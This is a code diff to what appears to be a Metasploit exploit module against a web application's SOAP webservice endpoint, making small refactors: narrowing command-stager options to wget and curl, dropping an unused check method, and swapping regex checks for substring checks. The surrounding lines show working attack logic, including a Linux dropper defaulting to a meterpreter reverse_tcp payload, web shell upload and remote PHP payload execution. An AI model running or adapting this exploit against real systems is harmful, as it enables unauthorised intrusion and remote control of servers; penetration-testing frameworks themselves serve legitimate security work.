@@ -68,7 +68,7 @@ class MetasploitModule < Msf::Exploit::Remote
               'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
               'Type' => :linux_dropper,
               'Linemax' => 65535,
-              'CmdStagerFlavor' => ['wget', 'curl', 'printf', 'bourne'],
+              'CmdStagerFlavor' => ['wget', 'curl'],
               'DefaultOptions' => {
                 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
               }
@@ -134,15 +134,6 @@ class MetasploitModule < Msf::Exploit::Remote
     EOS
   end
 
-  def check_vuln(cmd)
-    return send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'main', 'webservices', 'additional_webservices.php'),
-      'ctype' => 'text/xml; charset=utf-8',
-      'data' => soap_request(cmd).to_s
-    })
-  end
-
   def upload_webshell
     # randomize file name if option WEBSHELL is not set
     @webshell_name = if datastore['WEBSHELL'].blank?
@@ -200,7 +191,7 @@ class MetasploitModule < Msf::Exploit::Remote
     print_status("Checking if #{peer} can be exploited.")
     marker = Rex::Text.rand_text_alphanumeric(8..16)
     res = execute_command("echo #{marker}")
-    if res && res.code == 200 && res.body =~ /wsConvertPptResponse/ && res.body =~ /#{marker}/
+    if res && res.code == 200 && res.body.include?('wsConvertPptResponse') && res.body.include?(marker)
       CheckCode::Vulnerable
     else
       CheckCode::Safe('No valid response received from the target.')
@@ -212,7 +203,7 @@ class MetasploitModule < Msf::Exploit::Remote
     case target['Type']
     when :php
       res = upload_webshell
-      fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 200 && res.body =~ /wsConvertPptResponse/
+      fail_with(Failure::PayloadFailed, 'Web shell upload error.') unless res && res.code == 200 && res.body.include?('wsConvertPptResponse')
       register_file_for_cleanup(@webshell_name.to_s)
       execute_php(payload.encoded)
     when :unix_cmd
